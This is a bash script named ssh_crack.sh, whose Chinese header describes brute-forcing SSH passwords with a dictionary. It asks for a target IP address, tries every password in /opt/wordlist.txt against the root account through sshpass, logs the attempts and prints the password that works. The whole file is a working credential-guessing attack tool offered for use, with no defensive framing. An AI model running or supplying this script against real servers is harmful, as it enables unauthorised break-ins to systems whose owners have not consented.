<<!
 **********************************************************
 * Author        : Lifa
 * Email         : 991179382@qq.com
 * Last modified : 2018-11-27 17:33
 * Filename      : ssh_crack.sh
 * Description   : 根据密码字典暴力破解ssh
 * *******************************************************
!

#!/bin/bash
check_ip() {
if [ "$1" ] && [[ "$1" =~ ^[0-9]{1,}\.[0-9]{1,}\.[0-9]{1,}\.[0-9]{1,}$ ]];then
    echo "ip is ok" > /dev/null
	return 0
else
    echo "ip error" > /dev/null
	return 1
fi
}

clear
while true
do
    read -p "please input the target:" host
    if ! check_ip $host;then
        echo -e "\e[4;31mFailed:[$host]\e[0m(\e[4;33m[$host_ip]\e[0m is error)"
        continue
    fi
    break
done

#pass=`cat /opt/wordlist.txt`
date >> /opt/cracked.log
cat /opt/wordlist.txt | while read line
do
    clear
    echo -e "Try password \e[34m$line\e[0m"
    echo "to Crack $host ..."
    sshpass -p "$line" ssh root@$host "ip addr" >> /opt/cracked.log 2>&1
    if [ $? == 0 ];then
        clear
        echo -e "\e[32mSuccessful Cracking!\e[0mPassword is:"
        echo -e "\e[33m$line\e[0m"
        break
    fi
done